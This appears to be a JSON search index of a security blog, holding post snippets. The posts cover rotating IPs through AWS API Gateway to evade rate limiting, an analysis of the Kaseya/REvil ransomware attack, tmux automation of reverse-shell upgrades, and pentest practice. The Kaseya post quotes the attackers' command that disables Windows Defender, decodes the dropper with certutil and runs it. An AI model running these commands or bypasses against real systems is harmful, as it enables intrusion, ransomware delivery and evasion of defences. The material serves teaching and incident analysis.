[ { "title": "Using AWS API Gateway as a bypass for IP based rate¬†limiting", "url": "/posts/using-aws-api-gateway-as-a-bypass-for-ip-based-rate-limiting/", "categories": "", "tags": "infosec, pentesting, web, rate-limiting, aws, api-gateway, cloud", "date": "2022-09-03 00:00:00 +0000", "snippet": " This is how you can bypass any IP based rate limiting defenses in your red teaming/pentesting engagements: An AWS Free Tier account and an API Gateway HTTP ProxyThe situationImagine you are performing a penetration testing and need to execute some kind of high traffic action such as, for example, a directory/file discovery on a web server. Sometimes this type of activity is not possible due to rate limiting defenses implemented, that is, you have some kind of protection that detects high traffic coming from a single IP and blocks this source from requesting resources from the web server for a period of time or, worst, puts the IP in a blacklist for good.Here is a very simple diagram of the situation:In this post we‚Äôll see a tool that was recently introduced to me and we‚Äôll see exactly what it does. But we‚Äôll not dive into the tool. We‚Äôll instead manually apply everything that it automates for us and why it bypasses the rate limiting protection. This is actually a post about one of the resources of the AWS API Gateway service.The toolOn a recent engagement I decided to use a tool called fireprox, introduced to me by my good friend Raphael Mota in order to bypass this protection on the target server. Of course, all the credits for the tool and the use of the API Gateway Proxy resource for this propouse are in the github page of the tool. I just learned and decided to write a post about it.What this tool does is to automate the process of creating an pass-through HTTP Proxy using AWS API Gateway service. The magic is that every request coming from this proxy has an unique IP address. You read it right! An unique IP address for every request! Well, that‚Äôs the solution to our situation. Let‚Äôs see this magic happening, but I‚Äôll not cover how to create an AWS free tier account so the post doesn‚Äôt get too long.The first thing we need to do is create a new user in the ‚ÄúIdentity and Access Management (IAM)‚Äù AWS service:Let‚Äôs give this user a name and mark the ‚ÄúProgrammatic access‚Äù checkbox:Now let‚Äôs create a new group for this user. This is mandatory for the tool to work:Now we have to name the group and add the policy ‚ÄúAmazonAPIGatewayAdministrator‚Äù to it. This policy is needed so we can use this user‚Äôs credentials in the tool:Check if everything is correct and create the new user:Now write down the ACCESS KEY and the SECRET ACCESS KEY because we‚Äôll use them in our tool:Now that we have a user created, we can use the tool. After cloning the repository with git clone https://github.com/ustayready/fireprox and installing the dependencies with python3 -m pip install -r requirements.txt, we can see what it does:So, we can issue commands using the tool and we have to pass the user‚Äôs acecss keys:So, we don‚Äôt have any API‚Äôs yet. Let‚Äôs create one. But first, we need a target. This target is a service where the proxy will send all the requests to. I‚Äôll use a VPS of mine hosted by DigitalOcean. It will be a simple python web server:Now we can create a proxy using fireprox that points to our web server:So now, we can simply curl our newly created proxy and it will forward the request to our web server:Looking the web server log we see the request. Note the source IP address:We can see that this is not my real IP address:In fact, let‚Äôs simulate a directory listing attack and see what happens:See? One single IP address for every request! That‚Äôs awesome!!However, as a very famous saying in my country goes: not everything in life are flowers. Let‚Äôs use another python webserver and issue a request again:Ah-h√°! There‚Äôs a catch. The real source IP address is put in the header ‚ÄúX-Forwarded-For‚Äù and it arrives at the target. So if the web server or web application running on this server looks for this header, we‚Äôre done.To fix this, we can use a very neat resource provided to us by the API Gateway: a header mapping. Thanks to Fred Reimer for this awesome discovery!Turns out that we can send a custom header with our request, because fireprox creates a mapping from the header ‚ÄúX-My-X-Forwarded-For‚Äù to ‚ÄúX-Forwarded-For‚Äù, so we can control its content. Let‚Äôs see:Now, all we have to do is send one random IP address using this custom header and we‚Äôre done!Now you must be asking yourself what‚Äôs in this ‚Äúserver.py‚Äù file that allows me to see the header. Let‚Äôs take a quick look:This server simply uses the custom class ‚ÄúMyHandler‚Äù as base for actions based on the methods of the requests it gets. In this example, I only have actions for GET requests, jsut to make thing simple. we see that all it does is get the header i want and print it on the screen. The function ‚Äúconnection‚Äù serves the service and waits for incoming connections.Under the¬†hoodNow that we know how the tool works, let‚Äôs see what it does with our AWS credentials. Let‚Äôs go to the API Gateway service and see what‚Äôs there:As we can see above, fireprox creates a simple API structure. Let‚Äôs see the configs for this GET method:We can see a very clear structure: on the left, the client, in our case the curl command. On the far right, the target application on port 8585. In between, the proxy.Now, notice that we have the ‚ÄúMethod Request‚Äù and the ‚ÄúIntegration Request‚Äù boxes. The first one is the request that comes from the client. See the ‚ÄúX-My-X-Forwarded-For‚Äù header? This box knows that this header will come within the request.Also, we have the header ‚ÄúX-Forwarded-For‚Äù in the ‚ÄúIntegration Request‚Äù box, that represents the request going from the proxy to the final destination. Let‚Äôs see how this header mapping works:Clicking on the ‚ÄúIntegration Request‚Äù box, we can see its details, which include HTTP headers. See that we have one entry for that and there‚Äôs a mapping going on: The contents of the ‚ÄúX-Forwarded-For‚Äù header comes from the contents of the header ‚ÄúX-My-X-Forwarded-For‚Äù header from the client request. That‚Äôs how we can change the header contents.¬†Now you must be wondering: but what if we simply delete this header entry? Let‚Äôs see:Issuing another request:See? Somehow the behavior is still the same. My real IP address continues to leak through the ‚ÄúX-Forwarded-For‚Äù header. Somehow we still have the mapping in place even after deleting the header. And if we also delete the custom header from the ‚ÄúMethod Request‚Äù box, the result is the same. So we must use this custom header if we want to prevent our IP from leaking in the final request to the target application.Simulating requests with random IP addressesTo conclude our journey, I‚Äôll run a final attack simulation, but this time I‚Äôll also simulate a server that permanently blocks IP addresses that send requests faster than 10 per second.First, let‚Äôs create a very simple Python script that runs with threads and sends requests to our server:Python script for simulating sending requests using multi threading The function random_ip() just returns a random valid IP address; The function send_request() sends as many requests as the number passed in command line to the option ‚Äú‚Äìrequests‚Äù. It‚Äôs called once for every thread; All threads are spawned, each one calling the function send_request() with the arguments url, requests and delay.Now the target web server:Soon‚Ä¶¬†How to protect your application against this type of¬†attack?¬†Soon‚Ä¶¬†Final thoughtsIt‚Äôs needless to say that this is an amazing tool. And because I‚Äôm a little bit lazy, I‚Äôll just paste the print for the credits:As a final thought, please, don‚Äôt use this method in places you don‚Äôt have permission to. You can violate the AWS policy and get yourself in big trouble." }, { "title": "Kaseya Supply Chain Attack", "url": "/posts/kaseya-supply-chain-attack/", "categories": "", "tags": "", "date": "2021-07-05 00:00:00 +0000", "snippet": "Introdu√ß√£oH√° alguns dias atr√°s, a comunidade de seguran√ßa ao redor do mundo precisou se ocupar com o apelidado PrintNightmare. Uma falha cr√≠tica foi identificada no servi√ßo de impress√£o do sistema operacional Windows e que afeta diversas vers√µes do software, inclusive aquelas usadas em Domain Controllers.Dois dias adentro, contudo, outro evento ocorreu que, a princ√≠pio, foi ofuscado pelo que j√° estava ocorrendo. Um ataque de propor√ß√µes exponenciais ao software VSA da empresa Kaseya comprometeu milhares de clientes de dezenas de MSPs nos Estados Unidos.De acordo com as fontes consultadas, o software VSA da empresa foi comprometido por um 0-day que permitiu que uma atualiza√ß√£o falsa fosse emitida para os clientes dos MSPs que usam a op√ß√£o on premisses. A imagem abaixo pode ilustrar melhor a cadeia de ataque:Cadeia de ataque ao Kaseya VSA e clientes dos MSPsComo pode ser visto acima, os atacantes exploraram dezenas de servidores VSA que estavam expostos na internet e induziram atualiza√ß√µes falsas aos agentes instalados nos clientes.O mais agravante desse ataque √© o fato de que os agentes nos clientes s√£o executados com permiss√µes elevadas, o que permite plenos poderes ao ataque. Com isso, foi poss√≠vel, por exemplo, emitir comandos para desabilitar diversas prote√ß√µes nos endpoints afetados, como o Windows Defender.Detalhes T√©cnicos do AtaqueO ataque, inicialmente, explorou falhas como bypass de mecanismo de autentica√ß√£o, upload de arquivos arbrit√°rios e at√© inje√ß√£o de c√≥digo nos servidores VSA.A partir da√≠, um prodecimento foi agendado para enviar uma atualiza√ß√£o falsa a todos os computadores gerenciados pelos servidores afetados. Tal atualiza√ß√£o inclu√≠a a√ß√µes de desabilitar prote√ß√µes e download/desofusca√ß√£o e execu√ß√£o de um ransomware da gang REvil, que opera o chamado Ransomware-As-A-Service, ou seja, eles vendem ransomware como um servi√ßo. Abaixo temos parte dos comandos que foram executados nos clientes afetados:execFile(): Path=&quot;C:\\windows\\system32\\cmd.exe&quot;, arg=&quot;/c ping 127.0.0.1 -n 7615 &amp;gt; nul &amp;amp; C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend &amp;amp; copy /Y C:\\Windows\\System32\\certutil.exe C:\\Windows\\cert.exe &amp;amp; echo %RANDOM% &amp;gt;&amp;gt; C:\\Windows\\cert.exe &amp;amp; C:\\Windows\\cert.exe -decode c:\\kworking1\\agent.crt c:\\kworking1\\agent.exe &amp;amp; del /q /f c:\\kworking1\\agent.crt C:\\Windows\\cert.exe &amp;amp; c:\\kworking1\\agent.exe&quot;, flag=0x00000002, timeout=0 secondsAnalisando o bloco acima: execFile(): Path=‚ÄùC:\\windows\\system32\\cmd.exe‚Äù, arg=‚Äù/c ping 127.0.0.1 -n 7615 &amp;gt; null‚ÄùA primeira parte do c√≥digo invoca o cmd.exe e passa como argumentos primeiramente o comando ping para o localhost (127.0.0.1), especificando exatamente 7615 pacotes a serem enviados e descartando quaisquer sa√≠das textuais (&amp;gt; null). O objetivo desse comando ping provavelmente √© o de causar um atraso no processo de decodifica√ß√£o e execu√ß√£o do dropper e do ransomware. Essa abordagem pode ser √∫til em alguns casos para enganar os mecanismos de defesa (que ainda est√£o ativos). C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSendA seguir, ainda como argumento passado ao cmd.exe, √© chamado o powershell.exe, que executa o comando Set-MpPreference, que permite alterar configura√ß√µes do Windows Defender. Para ele s√£o passadas as op√ß√µes a seguir: -DisableRealtimeMonitoring $true: Desabilita a prote√ß√£o em tempo real. -DisableIntrusionPreventionSystem $true: desabilita prote√ß√£o de rede para vulnerabilidades conhecidas. -DisableIOAVProtection $true: Desabilita a verifica√ß√£o de arquivos e anexos baixados. -DisableScriptScanning $true: desabilita a verifica√ß√£o de scripts durante a verifica√ß√£o de malware. -EnableControlledFolderAccess Disabled: Desabilita a prote√ß√£o de arquivos contra ransomware e outras amea√ßas. -EnableNetworkProtection AuditMode -Force: Desabilita a prote√ß√£o contra acesso a dom√≠nios potencialmente perigosos e maliciosos, como dom√≠nios utilizados por campanhas de phishing, servidores de comando e controle e at√© mesmo de controle de ransomware. -MAPSReporting Disabled: Desabilita o envio de informa√ß√µes ao Microsoft Active Protection Service (MAPS) -SubmitSamplesConsent NeverSend: Desabilita o envio autom√°tico de samples para a Microsoft.Ap√≥s desabilitar as prote√ß√µes, √© iniciado o processo de execu√ß√£o do ransomware, que come√ßa utilizando o comando a seguir: copy /Y C:\\Windows\\System32\\certutil.exe C:\\Windows\\cert.exe &amp;amp; echo %RANDOM%¬†¬ª C:\\Windows\\cert.exeO comando acima cria uma c√≥pia do utilit√°rio certutil.exe, cujo nome √© cert.exe. Ap√≥s isso, √© acrescentado um n√∫mero aleat√≥rio ao final do arquivo novo:Manipula√ß√£o do utilit√°rio certutil.exeA t√©cnica acima pode ter sido feita para alterar a assinatura do execut√°vel original, j√° que, al√©m do nome ‚Äúcertutil‚Äù, o hash dele pode ser monitorado ativamente para detec√ß√£o de execu√ß√µes maliciosas. C:\\Windows\\cert.exe -decode c:\\kworking1\\agent.crt c:\\kworking1\\agent.exe &amp;amp; del /q /f c:\\kworking1\\agent.crt C:\\Windows\\cert.exe &amp;amp; c:\\kworking1\\agent.exeSeguindo o fluxo de execu√ß√£o, √© poss√≠vel ver que o novo arquivo cert.exe √© usado para realizar a decodifica√ß√£o base64 do arquivo agent.crt, que provavelmente foi colocado em todos os endpoints afetados pelo processo de atualiza√ß√£o falsa. Em seguida, o novo arquivo, agent.exe, √© criado e depois agent.crt e cert.exe s√£o deletados. Finalmente, agent.exe √© executado.agent.exe √© um execut√°vel conhecido como dropper, que tem por fun√ß√£o baixar e executar o c√≥digo malicioso final, ou seja, o ransomware. Neste caso, ele baixou um execut√°vel leg√≠timo do Windows Defenter, o MsMpEng.exe, e tamb√©m uma DLL chamada mpsvc.dll, que √© o ransomware propriamente dito. Entretanto, legitimamente falando, MpSvc.dll √© uma biblioteca que faz parte do Windows Protection Service, e √© utilizada pelo Windows Defender. Esse mecanismo foi utilizado no ataque provavelmente como forma de execu√ß√£o disfar√ßada do ransomware.A execu√ß√£o do arquivo MsMpEng.exe carrega automaticamente a DLL MpSvc.dll, que inicia o processo de criptografia dos arquivos do sistema afetado.Uma vez afetado, o sistema passa a ficar assim:Sistema afetado pelo ransomware REvil no ataque de Suplly Chain do Kaseya VSAInstru√ß√µes de pre√ßo e pagamento pelo processo de descriptografia dos arquivosEvolu√ß√£o do Cen√°rioA partir do momento que foi detectado, a comunidade de seguran√ßa logo come√ßou a agir para investigar o incidente e realizar medidas de mitiga√ß√£o do ataque. O que segue abaixo √© uma timeline de a√ß√µes e not√≠cias:No dia 3 de julho a Kaseya confirmou o ataque. A partir da√≠ v√°rias informa√ß√µes de impacto come√ßaram a surgir: Mais de 30 MSPs foram afetados ao redor do mundo; Rede de supermercados sueca Coop fechou mais de 400 lojas na sexta-feira depois de seus pontos de venda e checkouts terem parado de funcionar; 11 escolas afetadas pelo ataque; Falha do software VSA provavelmente foi um 0-day de bypass de mecanismo de autentica√ß√£o da interface web; Equipe de pesquisadores alem√£es estavam em processo de responsible disclosure com a Kaseya no momento do ataque; A empresa MawareBytes detecta um aumento consider√°vel do uso do ransonware REvil ao redor do mundo;Aumento de detec√ß√µes do malware REvil A gangue REvil se responsabilizou pelo ataque e exigiu a quantia de US$70.000.000,00 em BTC para liberar um decryptor para todos os afetados; A Kaseya liberou no dia 5 de julho uma ferramenta de detec√ß√£o de comprometimento, mas pede que todos os servidores VSA on premisses permane√ßam offline. A empresa HuntressLabs, por meio do update 12 na thread no Reddit, afirmou que o vetor inicial de ataque foi um bypass no mecanismo de autentica√ß√£o da interface web, garantindo uma sess√£o autenticada ao atacante e, ap√≥s isto, realizar o upload do payload original e executar comandos via falhas de SQL injection.Conclus√£oA investiga√ß√£o ainda est√° em andamento, at√© o momento da escrita deste post, mas j√° √© poss√≠vel dizer que este √© um dos maiores ataques cibern√©ticos da hist√≥ria.Assim que mais atualiza√ß√µes forem acontecendo, eu altero o post original para incluir os avan√ßos.Refer√™ncias Kaseya supply chain attack targeting MSPs to deliver REvil ransomware ‚Äî TRUESEC Blog Kaseya supply chain attack delivers mass ransomware event to US companies Mark Loman @üè° no Twitter: ‚ÄúIf your endpoint is hit, the initial ransom demand is 44,999 USD. https://t.co/gSWbxYJbeX‚Äù / Twitter Crticial Ransomware Incident in Progress : msp (reddit.com) [UPDATED: Thousands attacked as REvil ransomware hijacks Kaseya VSA ‚Äî Malwarebytes Labs Malwarebytes Labs](https://blog.malwarebytes.com/cybercrime/2021/07/shutdown-kaseya-vsa-servers-now-amidst-cascading-revil-attack-against-msps-clients/#detection-tool) Nicole Perlroth no Twitter: ‚ÄúAs it turns out, the ‚Äúzero day‚Äù used to breach Kesaya wasn‚Äôt a zero day. Dutch researchers tipped the company off to the issue, but Kesaya still hadn‚Äôt rolled out a patch when REvil used it for its ransomware spree.‚Äù / Twitter Worldwide ransomware attack: St Peter‚Äôs College and 10 other schools hit by US cyber attack ‚Äî NZ Herald Important Notice July 4th, 2021 ‚Äî Kaseya [Set-MpPreference (Defender) Microsoft Docs](https://docs.microsoft.com/en-us/powershell/module/defender/set-mppreference?view=windowsserver2019-ps) [Ativar a prote√ß√£o de rede Microsoft Docs](https://docs.microsoft.com/pt-br/microsoft-365/security/defender-endpoint/enable-network-protection?view=o365-worldwide) MpSvc.dll ‚Äî What is MpSvc.dll? ‚Äî Service Module (fileinspect.com)" }, { "title": "Using tmux for automating interactive reverse shells", "url": "/posts/using-tmux-for-automating-interactive-reverse-shells/", "categories": "Linux, Infosec", "tags": "linux, terminal, tmux, pentest, reverse-shell", "date": "2021-07-02 00:00:00 +0000", "snippet": " Automating the process of converting a non-interactive reverse shell to a fully interactive TTY.IntroductionI‚Äôve recently read agreat post about using the ‚Äúexpect‚Äù command line utility for automating the process of converting a non-interactive reverse shell to a fully interactive TTY, which means that by doing that, it‚Äôs possible to use features like tab completion, history navigation, clear the screen and, among others, being able to hit Ctrl-c without losing your access, which makes me really happy.I‚Äôve found the post very interesting because it uses a completely different approach that I had never seen before. So, since I also have a technique for automating this process, I decided to share it because it‚Äôs a different perspective, which also relies on a command line utility: tmux.The manual processCreating an interactive reverse shell manuallyThe above gif shows how you can convert a non-interactive reverse shell into a interactive one. Although it‚Äôs a fairly simple process, if you have the need to do it very often, it becomes a pain.Enter tmuxTmux is a terminal multiplexer command line utility that lets you create/control multiple shells from a single screen. One of its most powerful features is the ability to send keystrokes combinations into the shells automatically. Added to that is the feature that lets me create internal environment variables that I can use as short versions of big commands:Command strings being stored as environment variablesNow I can simply open tmux command prompt and send one of those strings into the currently active tmux pane:Sending strings into shells using tmuxThe magic of tmux automationNow that we know all of the features we need to use from tmux, we can build tmux shortcuts, or key bindings, in order to trigger actions of sending keystrokes to the currently active pane.Tmux key bindings for sending keystrokesThe ‚Äútmux.conf‚Äù lines above consist of two environment variables that hold two strings that will be send to the terminal later and two key bindings that will first send the key sequence _python3 -c ‚Äòimport pty;pty.spawn(\\‚Äù/bin/bash\\‚Äù)‚Äô_ followed by a _&amp;lt;Enter&amp;gt;_, and then send the sequence _C-z ‚Äústty raw -echo‚Äù Enter fg Enter reset Enter $shellexports Enter_. Note that ‚ÄúEnter‚Äù is not the word itself, but the *keystroke*, that is, a newline character. Tmux has a set of words that it recognizes as certain keyboard keys and ‚ÄúEnter‚Äù is one of them.The first bind command has to be executed after the prefix key combination, which in standard tmux is Ctrl-b, but in my case is Ctrl-a. The second bind command, which has the flag -n can be executed without the prefix combination.Here you might be thinking: ‚Äúbut why are you using two shortcuts instead of just one that sends everything at once?‚Äù The answer for that is simple: I wasn‚Äôt able to get it working by using only one key binding. If you find a way, please contact me because I‚Äôd love to know what I‚Äôve missed.The final resultNow every time you get a non-interactive shell, you can simply hit Ctrl-aqq in order to trigger the first binding (Ctrl-aq) and then sending the second part (Ctrl-q). Enjoy:Fully automated interactive shell from a non-interactive one\\x07\\x44\\x42\\x01\\x59\\x13\\x44" }, { "title": "White Box Penetration Testing: &#39;Cheating&#39; in order to boost impact and¬†value", "url": "/posts/white-box-penetration-testing-cheating-in-order-to-boost-impact-and-value/", "categories": "Infosec, Pentest", "tags": "infosec, white-box, pentest", "date": "2021-02-05 00:00:00 +0000", "snippet": "Almost every professional pentester is always thrilled when a black box pentesting comes along, however it‚Äôs probably in white box that you‚Äôll be able to give your reports more meaning.IntroductionEvery pentester knows (or at least they should) that when a new project is about to happen, they need to know, among other things, what level of information they are going to receive from the client prior and during the execution. This is important because it will impact how the work will be conducted. There are nowadays some well known names that define in high level how much information the offensive team will get. These are black box, gray box and white box. It‚Äôs not hard to find places on the internet that explain these types of penetration testing. I‚Äôll go over their main aspects so you and I are both on the same page:Black BoxThis is the most famous one. The reason for this is that it is the most challenging for the pentesters because they get almost no information at all from the client besides the domains, URL‚Äôs and IP ranges in scope.Finding a critical vulnerability while conducting a black box testing is always quite a ride and it makes the report look much better from the attacker‚Äôs perspective.The client usually gets impressed (and scared) by the findings when the project is conducted this way. This is because black box reminds a real attack more than the other types. See, a real attacker will have no prior information about its targets and they‚Äôll have to work hard to find what they need in order to be successful. And this is exactly what we are doing.The pros of doing black box pentesting include having a more realistic scenario, which gives the client a better view of how easy/hard it is to break into their environment from an attackers perspective.The cons include a higher probability of vulnerabilities that were not found and can still be exploited by real attackers. This is indeed one of the most difficult facts that we have to accept: we are not going to find everything. Of course, things like experience and technical skills can lower these odds, but the truth is that we can never be sure. And being in a black box project only makes things worse in that aspect.Grey BoxThis is an interesting one as it gathers a little bit of both worlds. The main characteristic here is partial knowledge. The client and the team will discuss what kinds of information will be shared and in what amount. Usually this is done when there are very specific needs for the client. Doing a black box testing on a custom app that is hosted on a very specific environment can be very hard and might not produce the desired results, for example.Another scenario where grey box testing is often considered is when you have to test an app that is heavily protected by firewalls, WAFs and other appliances. How can you test something that you can not reach? You will be testing only the protection‚Äôs effectiveness, but the app itself might have critical flaws. Will you really trust the defenses 100%? What if when a 0-day comes out and the app is finally exposed? For these what you can do is open up your defenses only for the team that is conducting the tests and let them do their job without having to worry about bypassing protections when the goal is really to test the app.White BoxHere we go! The most underrated, underestimated and misunderstood of all. White box testing focus on results, that is, finding the highest amount of vulnerabilities using the least amount of effort regarding collecting information.This type of execution relies heavily on collaboration between the offensive team and the client‚Äôs technical staff. That‚Äôs because they‚Äôll have to constantly go over each and every one of the assets in scope in order to get information. The key here is not wasting time doing information gathering. We don‚Äôt have to because now we have access to all the people responsible for developing and maintaining the assets. So we can ask them all sorts of questions: ‚Äúwhat‚Äôs running on these servers?‚Äù, ‚Äúwhat does this service do?‚Äù, ‚Äúlet me look at the source code for this feature, please?‚Äù and even ‚Äúcan you give me a low privilege user account so we can test for privilege escalation?‚Äù.I‚Äôll go over the pros of white box testing next. For now the only con I can think of is being far from a real attack scenario. You can not have a realistic pentest while ask the devs or sysadmind for the admin password (or can you?).The real meaning of a penetration testingWhen we execute a pentest, often times the only things we care about is to find those critical or high so we can once again prove ourselves as 1337 hackers. But what you may be forgetting is that we are professionals and as such, our real goal is to deliver value to whoever hired us. By value, I mean the client receives a product that‚Äôs worth the money they put into your pockets because they know that they can use the information in it to better secure their business. And we know very well that no matter how a vulnerability is discovered, if you find it, the‚Äôll like.Where white box¬†thrivesAs I‚Äôve already mentioned, in white box pentesting, we don‚Äôt have to worry too much on gathering information about the targets ourselves because all we have to do is ask. And here is where we can do a really great job.By asking the right questions to the right people, we get to know things that we might never know if we were on a black box or even on a grey box test. And while listening to the answers, we can put our ‚Äúmalicious‚Äù minds to work by correlating the information we‚Äôre getting with what we know.Let me give you some examples:Imagine you‚Äôre testing a web application and you find a form that might be vulnerable to SQL injection. You can first ask if there‚Äôs any protection guarding the app and if so, can they disable it just for you? You can also ask them to see the source code that handles the parameters the user input so you can see if they‚Äôre sanitizing and validating the data.Another good example for white box is when you are testing a very specific network configuration. You can suggest to have all the information on the network design, IP‚Äôs, services and everything that might be useful so you can more accurately assess the implementation.I know what you may be thinking right now: ‚ÄúThis is cheating!‚Äù Is it really? Are you playing a CTF or a video game? No. You‚Äôre a professional who‚Äôs being hired to do a job and it‚Äôs your responsibility to better advice your clients about the best possible options so they can have real value from your final product.The real world is not so simple,¬†thoughEverything I said so far is wonderful in paper. However it‚Äôs not always how things go. Let me give you a dose of reality:The client almost never will be able to allocate a professional just for you. What usually happens is that one or two people are pointed out to answer your questions and they‚Äôll pile up this task with their current work. So, often times you‚Äôll get people that take ages to answer, what will certainly delay your schedule.Another thing that happens a lot is when the client doesn‚Äôt want to pass information at all, even knowing what they‚Äôve hired and that you signed an NDA. You‚Äôll have to ‚Äúfight‚Äù to get the information you need or worse: you end up doing a black/grey box testing.Finally, this is for me the most dangerous situation: you get a client that is willing to answer all your questions. That‚Äôs great! But you must keep in mind that you CAN NOT trust 100% of what they say. Remember that they‚Äôre biased with their business and their product. I already heard a lot of ‚ÄúOh, but there‚Äôs nothing worth looking in this server. It‚Äôs completely isolated and there‚Äôs no information there.‚Äù only to prove them wrong in the end. You can‚Äôt let them ‚Äúpoison‚Äù your mind, so be skeptical. Always!ConclusionFor the clientsIf you are considering to hire a pentesting company or if you have an internal team, consider doing white box assessments in certain situations. Remember that the ultimate goal here is to protect your environment and the data in it, and doing so you protect your business. Doing an open information testing will give the offensive team more probability of finding things that would be more difficult to find in black box executions. And keep in mind that being difficult for your team to find something doesn‚Äôt mean that it‚Äôs also difficult for the real bad guys. They have all the time in the world to poke your environment and they have no scope restrictions. Also, they can be much better skilled hackers than your guys.For the professionalsAnd for you pentesters out there, I leave the following: don‚Äôt think you‚Äôre cheating when you do a white box pentest. Leave this mindset for when you‚Äôre playing CTF‚Äôs. When you do your job, the goal must be to deliver real impact and real value through your reports. So know when to use all the tools and options you have available." }, { "title": "This is how you can deliver true value through your pentest¬†reports", "url": "/posts/this-is-how-you-can-deliver-true-value-through-your-pentest-reports/", "categories": "Infosec, Pentest", "tags": "report, documentation", "date": "2021-01-12 00:00:00 +0000", "snippet": " There are only two things your client wants: how their business can be affected by impactful exploitation of a vulnerability and how they can prevent this from happening?The ScenarioLet‚Äôs say you are hired to perform a two-week penetration testing on a client‚Äôs major web application facing the internet. They‚Äôre interested in knowing if it has any flaws that can be exploited by a malicious actor. As a plus, they want you to act as closely as possible as a real threat actor, that is, your testing will be black box.You begin to prepare your toolbox of tactics, techniques and procedures that will fit the job‚Äôs requirements and on the agreed date you start playing with the application. Cool, here we go!Soon the two weeks fly by and you have a reasonable amount of vulnerabilities that you were able to successfully exploit and document.Now that you have finished the fun part, you start to put all of the findings in a report, so your client can fix the flaws as soon as possible. That should be easy to do, right? You just take each finding and put them in a table/list like format, present the PoC codes and you‚Äôre done. Piece of cake.The problemNow comes the day of the presentation, where you‚Äôll be able to show off your leet skills on how you were able to bypass their WAF and how this allowed the full compromise of their Active Directory (AD) and, as a consequence, their entire environment. You showed them a nice obfuscated payload for a XXE, showed also how you used CrackMapExec to enumerate the AD and finally you presented a very nice BloodHound graph that shows all the weak configurations that you used to compromise the environment.At the end of the presentation, the tech members, responsible for understanding the vulnerabilities so they can fix them, were stunned because they knew exactly what you had accomplished, but they started asking several questions about various parts of the process because for them it wasn‚Äôt clear how you did what you did. You tell them to look at the technical details in the report for further clarification, but you see in their faces that this didn‚Äôt help much.To make thing worse, the C-level on the meeting, which was the guy who hired you in the first place, had a poker face that you didn‚Äôt notice at first, but soon he also started asking several questions about what you could have done with what you found. He had already read the entire report and even so, he wasn‚Äôt able to get the point you were trying to make on the presentation.After you tried to answer questions that for you were so obvious, like ‚ÄúWhat could you have done with Domain Admin credentials?‚Äù or ‚ÄúWhat are those symbols in the payload used for the XXE?‚Äù, you go home asking yourself what went wrong. Why did they have so many questions? You thought you were going to nail the presentation.The explanationNow I‚Äôm going to show you why this can happen and how you can fix this problem. I‚Äôll divide this part into two: executive and technical communication.Technical communicationHere we have a few reasons where a situation like this can take place. The first one is about you overestimating the technical member‚Äôs knowledge of offensive security. You have to understand that our job is kind of unique, that is, we know that IT is a very diverse field; we have programmers, sysadmins, blue teamers, red teamers, tech support, printer magicians etc. The point is that everyone has a different area of study and different background. You cannot assume that every IT professional you talk with will understand 100% of what you‚Äôre saying.To address this specific issue, there are some things you can do: Explain in great details everything you did. Pretend that you are talking to a child about a complex topic, so this way you can come close to have a very detailed and didactic explanation; Organize your exploitation flow. This is about having a nice and easy to follow a story, where you can link every single action and make them talk to each other. This way you can more easily communicate your path inside the environment; Everything has to have references. Remember that you cannot assume that the tech team will understand each and every term you throw at them, so make sure you include reliable sources for every claim or every term that you‚Äôll use. This is also helpful so you can show them that you are not making anything up, everything has a reason and a proper trustworthy source; The recommendations are the most important part. You have to make sure they‚Äôll get the best possible recommendation for fixing the vulnerabilities you found. And this means explaining in detail why this recommendation is the right one. Also, make sure to include the proper sources for them; Take a lot of screenshots, they are free! However, every single screenshot you take must have three items so they don‚Äôt turn out useless or create difficulties instead of helping: Detailed description: have you ever heard the quote ‚Äúan image is worth a thousand words‚Äù? This applies very well in this case because you can‚Äôt think that an image alone will be enough to explain some technique you are trying to show. So, as soon as you take the screenshot, describe it, tell what you just did and how this connects with the process; Don‚Äôt take a screenshot of your entire monitor. Excess of useless information will do no help. Of course, there are situations where you will have to do this, but for most cases, you only have to capture enough to contextualize the reader and show the information you want to show. To help with this matter, it‚Äôs helpful to use a screenshot tool, like flameshot (my personal companion and recommendation) or greenshot. Both of them solve this problem for you because you can drag a rectangle on the screen to mark what you want to capture; Highlight the important stuff. Speaking of screenshot tools, you can also use them to draw on your pictures with ease. There are two critical cases when you want to do this: to hide information you don‚Äôt want to show (passwords, names etc) and to point out specific pieces of information on the picture to draw the readers attention, so they don‚Äôt feel lost without knowing where to look.I think that if you address those topics, you‚Äôll be able to boost your technical report so your audience can better understand what you‚Äôre trying to communicate.Executive communicationNow comes the most important part of your job: to be able to effectively communicate with the people who hired you. Remember all the questions they‚Äôve asked you? Well, this means that they didn‚Äôt understand your language, both in the report and the presentation. Remember: they‚Äôre not technical people, they are business people. So you have to be able to speak their language if you want them to understand the importance of your findings. This means that you have to: Speak using non-technical terms. It doesn‚Äôt matter if you explained what an XXE attack is or that you were able to compromise the Domain Admin account. They are not interested in knowing that. What matters for them is how this can damage their business, their clients or their client‚Äôs data; Show real business impact. This is why they hired you in the first place. So your job is quite incomplete if you don‚Äôt show them how their business can be affected by the things you‚Äôve found. To do that, the first thing you have to know is what‚Äôs their business about. In your first meeting, take some time to ask a few questions about what they do, how they operate and what is the most important things for them. Even if you get superficial answers, it‚Äôs better than nothing. This way you‚Äôll be able to link everything you found to their respective business impacts. Some examples might include: Client data theft (might lead to legal issues); Secret theft (patents, source codes etc); Employee data theft (might lead to legal issues); Stock market performance might be severely affected (show some examples);Another thing you can mention about business impact is how bad these flaws fall under the Brazilian LGPD law (or any other law regarding data protection). They can lead to huge fines and other severe consequences to the company. Finally, the last thing about executive communication is the writing of your report. It‚Äôs empirical that you are able to write well. Written communication is essential for the proper understanding of what you want to pass. This means that you must have good grammar skills, as well as be able to clearly communicate what you want. For this, you can always take a course in your native language or even look for some free online resources to learn and be more proficient. Remember that the best workers are known for their attention to detail, and your language and writing skills are the main tools you will use to deliver the product your client wants. And as the last point, this part doesn‚Äôt apply only to the executive part of your report. It‚Äôs needless to say that the entire document must benefit from clear and concise writing.ConclusionAfter this journey, we can clearly see that it takes so much more than being a leet hacker if you want 